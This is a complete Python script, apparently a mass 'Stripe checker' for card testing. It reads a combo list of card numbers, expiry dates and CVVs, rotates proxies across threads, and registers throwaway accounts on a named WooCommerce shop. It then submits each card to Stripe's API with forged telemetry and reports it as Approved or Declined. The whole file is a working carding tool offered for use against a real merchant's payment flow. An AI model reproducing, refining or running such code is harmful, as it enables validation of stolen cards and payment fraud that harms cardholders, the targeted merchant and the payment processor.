import requests
import json
import re
import time
import random
import datetime
import os
import threading
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, Any, Optional
from faker import Faker
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.align import Align
from rich.prompt import Prompt

faker = Faker()
console = Console()
print_lock = threading.Lock()
card_serial = 0

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_banner():
    banner_text = """
          __         .__               
  _______/  |________|__|_____   ____  
 /  ___/\   __\_  __ \  \____ \_/ __ \ 
 \___ \  |  |  |  | \/  |  |_> >  ___/ 
/____  > |__|  |__|  |__|   __/ \___  >
     \/                 |__|        \/ 
           
        AUTO STRIPE MASS CHECKER         
"""
    return Panel(
        Align.center(Text(banner_text, style="bold cyan")),
        border_style="bright_blue",
        padding=(1, 2)
    )

def show_author_info():
    info = Text()
    info.append("Author - ", style="bold magenta")
    info.append("Walter\n", style="bold white")
    info.append("Github - ", style="bold magenta")
    info.append("github.com/walterwhite-69\n", style="bold white")
    info.append("*Please star the repository if it helped*", style="italic yellow")
    console.print(Align.center(Panel(info, border_style="green", padding=(0, 2))))

def auto_request(
    url: str,
    method: str = 'GET',
    headers: Optional[Dict[str, str]] = None,
    data: Optional[Dict[str, Any]] = None,
    params: Optional[Dict[str, Any]] = None,
    json_data: Optional[Dict[str, Any]] = None,
    dynamic_params: Optional[Dict[str, Any]] = None,
    session: Optional[requests.Session] = None,
    proxies: Optional[Dict[str, str]] = None
) -> requests.Response:
    clean_headers = {}
    if headers:
        for key, value in headers.items():
            if key.lower() != 'cookie':
                clean_headers[key] = value
    
    if data is None: data = {}
    if params is None: params = {}

    if dynamic_params:
        for key, value in dynamic_params.items():
            if 'ajax' in key.lower(): params[key] = value
            else: data[key] = value

    req_session = session if session else requests.Session()

    request_kwargs = {
        'url': url,
        'headers': clean_headers,
        'data': data if data else None,
        'params': params if params else None,
        'json': json_data,
        'proxies': proxies,
        'timeout': 20 # Increased for slow proxies
    }

    request_kwargs = {k: v for k, v in request_kwargs.items() if v is not None}
    response = req_session.request(method, **request_kwargs)
    return response

def extract_message(response: requests.Response) -> str:
    try:
        response_json = response.json()
        if 'message' in response_json: return response_json['message']
        
        # Improved recursive search for 'message' key
        def find_msg(obj):
            if isinstance(obj, dict):
                if 'message' in obj: return obj['message']
                for v in obj.values():
                    res = find_msg(v)
                    if res: return res
            return None
        
        res_msg = find_msg(response_json)
        if res_msg: return res_msg

        return f"Message key not found. Full response: {json.dumps(response_json, indent=2)}"
    except:
        match = re.search(r'"message":"(.*?)"', response.text)
        if match: return match.group(1)
        return f"Response is not valid JSON. Status: {response.status_code}. Text: {response.text[:100]}..."

def run_automated_process(card_num, card_cvv, card_yy, card_mm, proxies=None):
    session = requests.Session()
    base_url = 'https://dilaboards.com'
    user_ag = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    
    try:
        url_1 = f'{base_url}/en/moj-racun/add-payment-method/'
        headers_1 = {'User-Agent': user_ag}
        response_1 = auto_request(url_1, method='GET', headers=headers_1, session=session, proxies=proxies)
        
        reg_match = re.search('name="woocommerce-register-nonce" value="(.*?)"', response_1.text)
        pk_match = re.search('"key":"(.*?)"', response_1.text)
        if not reg_match or not pk_match: return "Failed to extract session tokens"
        
        regester_nouce = reg_match.group(1)
        pk = pk_match.group(1)

        data_2 = {
            'email': faker.email(),
            'woocommerce-register-nonce': regester_nouce,
            'register': 'Register',
        }
        response_2 = auto_request(url_1, method='POST', headers={'User-Agent': user_ag}, data=data_2, session=session, proxies=proxies)
        
        nonce_match = re.search('"createAndConfirmSetupIntentNonce":"(.*?)"', response_2.text)
        if not nonce_match: return "Failed to extract ajax nonce"
        ajax_nonce = nonce_match.group(1)

        url_3 = 'https://api.stripe.com/v1/payment_methods'
        # Generating random telemetry/metadata required by Stripe
        muid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
        sid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
        guid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
        client_id = "src_" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))

        data_3 = {
            'type': 'card',
            'card[number]': card_num,
            'card[cvc]': card_cvv,
            'card[exp_year]': card_yy,
            'card[exp_month]': card_mm,
            'allow_redisplay': 'unspecified',
            'billing_details[address][postal_code]': '11081',
            'billing_details[address][country]': 'US',
            'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
            'referrer': f'{base_url}',
            'time_on_page': str(random.randint(10000, 99999)),
            'client_attribution_metadata[client_session_id]': client_id,
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[elements_session_config_id]': client_id,
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
            'guid': guid, 'muid': muid, 'sid': sid, 'key': pk,
            '_stripe_version': '2024-06-20',
        }
        response_3 = auto_request(url_3, method='POST', headers={'User-Agent': user_ag}, data=data_3, proxies=proxies)
        
        if response_3.status_code != 200: return f"Stripe Error: {extract_message(response_3)}"
        pm = response_3.json().get('id')

        dynamic_params_4 = {
            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        response_4 = auto_request(base_url + '/en/', method='POST', headers={'User-Agent': user_ag}, dynamic_params=dynamic_params_4, session=session, proxies=proxies)
        
        msg = extract_message(response_4)
        status = "Approved" if response_4.json().get("success") else "Declined"
        return f"{status} | {msg}"
    except Exception as e:
        return f"Error: {str(e)}"

def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 2:
        return {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
    elif len(parts) == 4:
        ip, port, user, pwd = parts
        return {"http": f"http://{user}:{pwd}@{ip}:{port}", "https": f"http://{user}:{pwd}@{ip}:{port}"}
    return None

def process_card(card, proxies_list):
    global card_serial
    raw_proxy = random.choice(proxies_list) if proxies_list else None
    proxy_dict = format_proxy(raw_proxy)
    
    try:
        c_data = card.split('|')
        if len(c_data) == 4:
            c_num, c_mm, c_yy, c_cvv = c_data
            result = run_automated_process(c_num, c_cvv, c_yy, c_mm, proxy_dict)
        else:
            result = "Error: Invalid Format"
    except Exception as e:
        result = f"Error: {str(e)}"

    with print_lock:
        card_serial += 1
        output = Text()
        output.append(f"[{card_serial}] ", style="bold green")
        output.append(f"{card} ")
        output.append("---> ", style="yellow")
        
        if raw_proxy:
            output.append(f"({raw_proxy.split(':')[0]}) ", style="cyan")
            output.append("---> ", style="yellow")
        
        res_style = "bold green" if "Approved" in result else "bold red"
        output.append(result, style=res_style)
        console.print(output)

def main():
    global card_serial
    while True:
        clear_screen()
        console.print(get_banner())
        
        combo_path = Prompt.ask("[bold yellow][*] Combo list path[/]")
        if not os.path.exists(combo_path):
            console.print("[bold red][!] File not found![/]")
            time.sleep(1.5)
            continue
            
        proxy_path = Prompt.ask("[bold yellow][*] Proxy list path (Optional, press Enter to skip)[/]", default="")
        threads = int(Prompt.ask("[bold yellow][*] Number of threads[/]", default="10"))
        
        proxies_list = []
        if proxy_path and os.path.exists(proxy_path):
            with open(proxy_path, 'r') as f:
                proxies_list = [line.strip() for line in f if line.strip()]
        
        with open(combo_path, 'r') as f:
            combos = [line.strip() for line in f if line.strip()]

        clear_screen()
        show_author_info()
        
        card_serial = 0
        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(lambda c: process_card(c, proxies_list), combos)

        if Prompt.ask("\n[bold yellow][?] Send to main menu?[/]", choices=["y", "n"], default="y") == 'n':
            break

if __name__ == '__main__':
    main()